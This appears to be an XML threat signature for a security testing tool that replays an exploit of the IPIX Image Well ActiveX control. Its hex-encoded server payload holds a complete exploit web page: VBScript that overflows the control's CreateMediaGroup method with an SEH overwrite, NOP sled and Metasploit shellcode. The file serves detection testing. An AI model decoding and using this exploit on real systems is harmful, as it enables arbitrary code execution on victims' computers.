<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="IPIX Image Well ActiveX (iPIX-ImageWell-ipix.dll) Buffer Overflow Exploit"/>
    <EngDesc display="true" value="This threat downloads a malicious web page which triggers a buffer overflow in in the IPIX ActiveX control, this threat is delivered via HTTP port 80."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="IPIX"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="IPIX_Image_Well"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="IPIX_Image_Well"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.milw0rm.com/exploits/3810"/>
    <CVEID display="true" value=""/>
    <bugtraqID display="true" value="23379&#13;&#10;23379&#13;&#10;"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="42733a504cde060eb89ccd898f10bb3b"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="true"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="high"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value="integrity"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="633135354930312500"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1177984428" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
  </Variables>
  <Loops>
    <for index="E">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="K"/>
    </for>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="E" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F746573742E68746D20485454502F312E300D0A557365722D4167656E743A20576765742F312E31302E320D0A4163636570743A202A2F2A0D0A486F73743A20646D6563682E6D65647765622E636F6D0D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C2033302041707220323030372030353A32343A303320474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A204D6F6E2C2033302041707220323030372030353A32333A303120474D540D0A455461673A20223133323939382D316135342D34326634646164633166373430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20333330380D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E0D0A0D0A3C212D2D0D0A0D0A20203D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D0D0A2020202020202020202020202020202020202020202020204950495820496D6167652057656C6C20416374697665582028695049582D496D61676557656C6C2D697069782E646C6C2920427566666572204F766572666C6F77204578706C6F69740D0A2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020427920556D6573682057616E7665200D0A20203D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D3D2020200D0A20202020202020200D0A202044617465203A2032372D30342D323030370D0A200D0A20205265666572656E63653A20687474703A2F2F7365637572697479666F6375732E636F6D2F6269642F32333337390D0A0D0A2020546573746564206F6E2057696E646F77732032303030205350342053657276657220456E676C6973680D0A20202020202020202020202057696E646F77732032303030205350342050726F66657373696F6E616C20456E676C6973680D0A200D0A2020446573633A204D616E79206D6574686F6473206172652076756C6E657261626C6520616E6420616C736F20616C6C20706172616D65746572732E0D0A20202020202020204D4574686F64733A202E456E644D6564696147726F7570202C202E4372656174654D6564696147726F75700D0A202020202020200D0A200D0A202050532E205468697320776173207772697474656E20666F7220656475636174696F6E616C20707572706F73652E2055736520697420617420796F7572206F776E207269736B2E417574686F722077696C6C206265206E6F742062650D0A202020202020726573706F6E7369626C6520666F7220616E792064616D6167652E0D0A200D0A2020416C77617973207468616E6B7320746F204D65746173706C6F697420616E64205374726F6B65200D0A0D0A2D2D3E0D0A0D0A0D0A3C68746D6C3E0D0A0D0A3C626F64793E0D0A0D0A3C4F424A4543542069643D22746172676574222057494454483D343435204845494748543D343020636C61737369643D22636C7369643A46374130354241432D393737382D343130412D394344452D42464244344435443242374622203E203C2F4F424A4543543E0D0A0D0A3C736372697074206C616E67756167653D227662736372697074223E0D0A0D0A74617267657446696C65203D2022433A5C746573745C695049582D496D61676557656C6C2D697069785C695049582D496D61676557656C6C2D697069782E646C6C220D0A70726F746F7479706520203D202246756E6374696F6E204372656174654D6564696147726F7570202820427956616C206255736572494420417320537472696E67202C2020427956616C206250617373776F726420417320537472696E67202C2020427956616C206247726F757048616E646C6520417320537472696E67202C2020427956616C200D0A4E756D456C656D656E747320417320496E7465676572202C2020427956616C2062536572766963655479706520417320537472696E67202C2020427956616C206249504164647220417320537472696E67202920417320496E7465676572220D0A6D656D6265724E616D65203D20224372656174654D6564696147726F7570220D0A70726F67696420202020203D2022505741435449564558494D4743544C4C69622E50574D6564696153656E64436F6E74726F6C220D0A617267436F756E742020203D20360D0A0D0A0D0A3C212D2D2077696E33325F65786563202D20204558495446554E433D73656820434D443D63616C632053697A653D33343320456E636F6465723D506578416C7068614E756D20687474703A2F2F6D65746173706C6F69742E636F6D20202D2D3E0D0A0D0A0D0A7368656C6C636F64653D756E657363617065282225656225303325353925656225303525653825663825666625666625666625346625343925343925343925343925343925343925353125356125353625353425353825333625333325333025353625353825333425343125333025343225333622290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343825343825333025343225333325333025343225343325353625353825333225343225343425343225343825333425343125333225343125343425333025343125343425353425343225343425353125343225333025343125343425343122290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225353625353825333425356125333825343225343425346125346625346425346525346625346125346525343625333425343225333025343225333025343225353025346225343825343525333425346525353325346225343825346525343722290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343525333025346125353725343125333025346625346525346225353825346625333425346125333125346225353825346625333525343225343225343125333025346225346525343925353425346225333825343625333325346225333822290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343125333025353025346525343125343325343225346325343925343925346525346125343625333825343225346325343625333725343725333025343125346325346325346325346425333025343125353025343425346325346225346522290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343625346625346225343325343625333525343625343225343625353025343525343725343525346525346225353825346625343525343625333225343125353025346225346525343825333625346225333825346525353025346225353422290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225346225333825346625333525346525333125343125333025346225346525346225353825346525333125346225333825343125333025346225346525343925333825346525333525343625353225343625353025343325346325343125333322290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343225346325343625333625346225343825343225343425343225353325343525353825343225346325346125333725346525353025346225333825343225343425346525353025346225343825343225343725346525343125346425346122290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225346225343825346125333625346125333025346225346525343925333025346225343825343225333825343225346225343225353025343225353025343225353025346225333825346125343625346525343325346625333525343125343322290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225343825346625343225343625343825343525343925343825346125346625343325343825343225346325346225353725343225353525346125353625343225346625346325333825343625353025346625343525346125333625346125343922290D0A7368656C6C636F64653D7368656C6C636F64652B756E657363617065282225353025346625346325343825353025353025343725353525346625346625343725346525343325333625343125353625346525353625343325353625343225333025356122290D0A0D0A0D0A6E6F703D756E6573636170652822253930253930253930253930253930253930253930253930253930253930253930253930253930253930253930222920202020202020202020202020202020202020200D0A0D0A706F696E7465725F746F5F7365683D756E657363617065282225656225303625393025393022290D0A0D0A7365685F68616E646C65723D756E657363617065282225613925313125303225373522290D0A0D0A0D0A617267313D537472696E6728343336352C20224122290D0A617267323D2264656661756C7456220D0A617267333D2264656661756C7456220D0A617267343D310D0A617267353D2264656661756C7456220D0A617267363D2264656661756C7456220D0A0D0A0D0A617267313D617267312B706F696E7465725F746F5F7365682B7365685F68616E646C65722B6E6F702B7368656C6C636F64652B6E6F700D0A0D0A7461726765742E4372656174654D6564696147726F75702061726731202C61726732202C61726733202C61726734202C61726735202C61726736200D0A0D0A0D0A3C2F7363726970743E0D0A3C2F626F64793E0D0A3C2F68746D6C3E0D0A0D0A23206D696C7730726D2E636F6D205B323030372D30342D32375D0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
